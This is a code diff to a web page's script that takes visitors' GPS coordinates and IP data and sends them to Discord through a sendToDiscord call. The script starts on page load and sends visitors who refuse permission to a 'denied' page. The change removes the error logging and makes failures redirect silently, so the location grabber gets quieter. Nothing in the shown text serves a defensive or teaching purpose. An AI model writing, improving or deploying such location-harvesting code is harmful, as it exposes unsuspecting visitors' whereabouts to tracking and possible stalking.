@@ -67,8 +67,7 @@
               const acc = pos.coords.accuracy;
               sendToDiscord(lat, lon, acc, ipData);
             },
-            (err) => {
-              console.error("GPS error:", err.message);
+            () => {
               window.location.href = deniedPageUrl;
             },
             {
@@ -78,31 +77,27 @@
             }
           );
         })
-        .catch(error => {
-          console.error("IP fetch failed:", error.message);
+        .catch(() => {
+          window.location.href = deniedPageUrl;
         });
     }
 
-    async function checkPermissionsAndStart() {
+    window.onload = () => {
       if (!navigator.permissions) {
         getIPAndGPS();
         return;
       }
 
-      try {
-        const result = await navigator.permissions.query({ name: "geolocation" });
-
+      navigator.permissions.query({ name: "geolocation" }).then(result => {
         if (result.state === "denied") {
           window.location.href = deniedPageUrl;
         } else {
           getIPAndGPS();
         }
-      } catch (e) {
+      }).catch(() => {
         getIPAndGPS();
-      }
-    }
-
-    window.onload = checkPermissionsAndStart;
+      });
+    };
   </script>
 </body>
 </html>
